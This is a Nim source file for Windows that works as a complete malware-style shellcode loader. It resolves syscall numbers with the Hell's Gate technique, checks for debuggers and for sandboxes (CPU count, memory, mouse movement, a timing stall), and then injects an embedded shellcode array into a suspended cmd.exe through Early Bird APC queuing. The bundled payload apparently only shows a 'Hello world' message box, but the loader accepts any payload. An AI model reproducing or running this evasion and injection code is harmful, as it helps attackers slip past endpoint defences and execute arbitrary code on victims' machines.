import winim/lean, strutils

{.passC: "-masm=intel".}

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc fibonacci(n: int): string =
  if n == 0: return "0"
  if n == 1: return "1"
  var a = @[0]
  var b = @[1]
  for i in 2..n:
    var carry = 0
    var temp: seq[int] = @[]
    let maxLen = max(a.len, b.len)
    for j in 0..<maxLen:
      let digitA = if j < a.len: a[j] else: 0
      let digitB = if j < b.len: b[j] else: 0
      let sum = digitA + digitB + carry
      temp.add(sum mod 10)
      carry = sum div 10
    if carry > 0: temp.add(carry)
    a = b
    b = temp
  result = ""
  for j in countdown(b.high, 0):
    result.add($b[j])

# ============================================================================
# Hell's Gate - Syscall Evasion Infrastructure
# ============================================================================

var syscall*: WORD

type
  HG_TABLE_ENTRY* = object
    pAddress*: PVOID
    dwHash*: uint64
    wSysCall*: WORD
  PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

# DJB2 Hash Function
proc djb2_hash*(pFuncName: string): uint64 =
  var hash: uint64 = 0x5381
  for c in pFuncName:
    hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))
  return hash

# Get PEB via inline ASM
proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
  asm """
      mov rax, qword ptr gs:[0x60]
      ret
  """

# Helper: Convert Flink to Module
proc flinkToModule*(pCurrentFlink: LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
  return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

# Helper: Get module buffer
proc moduleToBuffer*(pCurrentModule: PLDR_DATA_TABLE_ENTRY): PWSTR =
  return pCurrentModule.FullDllName.Buffer

# Get Export Table from module
proc getExportTable*(pCurrentModule: PLDR_DATA_TABLE_ENTRY, pExportTable: var PIMAGE_EXPORT_DIRECTORY): bool =
  let
    pImageBase: PVOID = pCurrentModule.DLLBase
    pDosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](pImageBase)
    pNTHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)

  if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
    return false

  if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
    return false

  pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)
  return true

# Find function in export table and extract syscall number
proc getTableEntry*(pImageBase: PVOID, pCurrentExportDirectory: PIMAGE_EXPORT_DIRECTORY, tableEntry: var HG_TABLE_ENTRY): bool =
  var
    cx: DWORD = 0
    numFuncs: DWORD = pCurrentExportDirectory.NumberOfNames
  let
    pAddrOfFunctions: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
    pAddrOfNames: ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
    pAddrOfOrdinals: ptr UncheckedArray[WORD] = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)

  while cx < numFuncs:
    var
      pFuncOrdinal: WORD = pAddrOfOrdinals[cx]
      pFuncName: string = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
      funcHash: uint64 = djb2_hash(pFuncName)
      funcRVA: DWORD64 = pAddrOfFunctions[pFuncOrdinal]
      pFuncAddr: PVOID = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)

    if funcHash == tableEntry.dwHash:
      tableEntry.pAddress = pFuncAddr
      # Extract syscall number from function stub (offset +4 after mov r10, rcx)
      if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
      return true
    inc cx
  return false

# Get next module in list
proc getNextModule*(flink: var LIST_ENTRY): PLDR_DATA_TABLE_ENTRY =
  flink = flink.Flink[]
  return flinkToModule(flink)

# Search loaded modules for syscall
proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bool =
  var
    currFlink: LIST_ENTRY = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
    currModule: PLDR_DATA_TABLE_ENTRY = flinkToModule(currFlink)
    pExportTable: PIMAGE_EXPORT_DIRECTORY
  let
    beginModule = currModule

  while true:
    if getExportTable(currModule, pExportTable):
      if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
        return true

    currModule = getNextModule(currFlink)
    if beginModule == currModule:
      break
  return false

# Main syscall resolver
proc getSyscall*(tableEntry: var HG_TABLE_ENTRY): bool =
  let currentPeb: PPEB = GetPEBAsm64()
  if not searchLoadedModules(currentPeb, tableEntry):
    return false
  return true

# ============================================================================
# NT API Wrappers (Direct Syscall Invocation)
# ============================================================================

# NtAllocateVirtualMemory - Replaces VirtualAlloc/VirtualAllocEx
proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
  asm """
      mov r10, rcx
      movzx eax, word ptr [rip + `syscall`]
      syscall
      ret
  """

# NtProtectVirtualMemory - Replaces VirtualProtect
proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
  asm """
      mov r10, rcx
      movzx eax, word ptr [rip + `syscall`]
      syscall
      ret
  """

# NtWriteVirtualMemory - Replaces WriteProcessMemory
proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
  asm """
      mov r10, rcx
      movzx eax, word ptr [rip + `syscall`]
      syscall
      ret
  """

# ============================================================================

proc checkResources(): bool =
  var sysInfo: SYSTEM_INFO
  GetSystemInfo(addr sysInfo)
  if sysInfo.dwNumberOfProcessors < 2:
    return false
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = cast[DWORD](sizeof(memStatus))
  GlobalMemoryStatusEx(addr memStatus)
  if cast[uint64](memStatus.ullTotalPhys) < 2147483648'u64:
    return false
  return true

proc sleepObfuscation(): bool =
  let n = 100000
  let result = fibonacci(n)
  return true

proc checkMouseMovement(): bool =
  var startPos: POINT
  GetCursorPos(addr startPos)
  let startTime = GetTickCount()
  while true:
    var currentPos: POINT
    GetCursorPos(addr currentPos)
    let dist = abs(currentPos.x - startPos.x) + abs(currentPos.y - startPos.y)
    if dist > 50:
      return true
    if (GetTickCount() - startTime) > 20000:
      echo "[-] Sandbox detected: No mouse movement"
      return false
    Sleep(100)

proc pebBeingDebugged(): bool {.asmNoStackFrame.} =
  asm """
  mov rax, gs:[0x60]
  movzx rax, byte ptr [rax+2]
  ret
  """

proc injectShellcode(shellcode: seq[byte]) =
  var
    si: STARTUPINFOW
    pi: PROCESS_INFORMATION

  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESHOWWINDOW

  # 1. Create suspended process
  let success = CreateProcessW(
    L"C:\\Windows\\System32\\cmd.exe",
    nil,
    nil,
    nil,
    FALSE,
    CREATE_SUSPENDED,
    nil,
    L"C:\\Windows\\System32",
    addr si,
    addr pi
  )

  if success == 0:
    echo "[-] CreateProcessW failed: ", GetLastError()
    quit(1)

  # 2. Allocate memory in remote process
  let hMemory = VirtualAllocEx(
    pi.hProcess,
    nil,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )

  if hMemory == nil:
    echo "[-] VirtualAllocEx failed"
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
    quit(1)

  # 3. Write shellcode to allocated memory
  var bytesWritten: SIZE_T
  let writeSuccess = WriteProcessMemory(
    pi.hProcess,
    hMemory,
    addr shellcode[0],
    cast[SIZE_T](shellcode.len),
    addr bytesWritten
  )

  if writeSuccess == 0:
    echo "[-] WriteProcessMemory failed"
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
    quit(1)

  # 4. Queue APC to execute shellcode
  let apcSuccess = QueueUserAPC(
    cast[PAPCFUNC](hMemory),
    pi.hThread,
    0
  )

  if apcSuccess == 0:
    echo "[-] QueueUserAPC failed"
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
    quit(1)

  # 5. Resume thread to execute APC
  echo "[+] Executing shellcode via Early Bird (APC)..."
  discard ResumeThread(pi.hThread)

  # Cleanup
  discard CloseHandle(pi.hThread)
  discard CloseHandle(pi.hProcess)

var shellcode: array[433, byte] = [0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x52, 0x00, 0x00, 0x00, 0xE8, 0x9E, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF8, 0x48, 0x8D, 0x0D, 0x5D, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x5F, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x4D, 0x00, 0x00, 0x00, 0xE8, 0x7F, 0x00, 0x00, 0x00, 0x4D, 0x33, 0xC9, 0x4C, 0x8D, 0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4E, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x56, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0xE8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x4C, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x40, 0x18, 0x4D, 0x8D, 0x60, 0x10, 0x4D, 0x8B, 0x04, 0x24, 0xFC, 0x49, 0x8B, 0x78, 0x60, 0x48, 0x8B, 0xF1, 0xAC, 0x84, 0xC0, 0x74, 0x26, 0x8A, 0x27, 0x80, 0xFC, 0x61, 0x7C, 0x03, 0x80, 0xEC, 0x20, 0x3A, 0xE0, 0x75, 0x08, 0x48, 0xFF, 0xC7, 0x48, 0xFF, 0xC7, 0xEB, 0xE5, 0x4D, 0x8B, 0x00, 0x4D, 0x3B, 0xC4, 0x75, 0xD6, 0x48, 0x33, 0xC0, 0xE9, 0xA7, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x58, 0x30, 0x44, 0x8B, 0x4B, 0x3C, 0x4C, 0x03, 0xCB, 0x49, 0x81, 0xC1, 0x88, 0x00, 0x00, 0x00, 0x45, 0x8B, 0x29, 0x4D, 0x85, 0xED, 0x75, 0x08, 0x48, 0x33, 0xC0, 0xE9, 0x85, 0x00, 0x00, 0x00, 0x4E, 0x8D, 0x04, 0x2B, 0x45, 0x8B, 0x71, 0x04, 0x4D, 0x03, 0xF5, 0x41, 0x8B, 0x48, 0x18, 0x45, 0x8B, 0x50, 0x20, 0x4C, 0x03, 0xD3, 0xFF, 0xC9, 0x4D, 0x8D, 0x0C, 0x8A, 0x41, 0x8B, 0x39, 0x48, 0x03, 0xFB, 0x48, 0x8B, 0xF2, 0xA6, 0x75, 0x08, 0x8A, 0x06, 0x84, 0xC0, 0x74, 0x09, 0xEB, 0xF5, 0xE2, 0xE6, 0x48, 0x33, 0xC0, 0xEB, 0x4E, 0x45, 0x8B, 0x48, 0x24, 0x4C, 0x03, 0xCB, 0x66, 0x41, 0x8B, 0x0C, 0x49, 0x45, 0x8B, 0x48, 0x1C, 0x4C, 0x03, 0xCB, 0x41, 0x8B, 0x04, 0x89, 0x49, 0x3B, 0xC5, 0x7C, 0x2F, 0x49, 0x3B, 0xC6, 0x73, 0x2A, 0x48, 0x8D, 0x34, 0x18, 0x48, 0x8D, 0x7C, 0x24, 0x30, 0x4C, 0x8B, 0xE7, 0xA4, 0x80, 0x3E, 0x2E, 0x75, 0xFA, 0xA4, 0xC7, 0x07, 0x44, 0x4C, 0x4C, 0x00, 0x49, 0x8B, 0xCC, 0x41, 0xFF, 0xD7, 0x49, 0x8B, 0xCC, 0x48, 0x8B, 0xD6, 0xE9, 0x14, 0xFF, 0xFF, 0xFF, 0x48, 0x03, 0xC3, 0x48, 0x83, 0xC4, 0x28, 0xC3]

proc main() =
  if IsDebuggerPresent(): quit(0)
  if pebBeingDebugged(): quit(0)
  echo "[*] Performing sandbox checks..."
  if not sleepObfuscation(): quit(0)
  if not checkResources(): quit(0)
  if not checkMouseMovement(): quit(0)

  # Convert array to seq for easier handling
  var shellcodeByte = @shellcode
  var finalShellcode = shellcodeByte
  injectShellcode(finalShellcode)

main()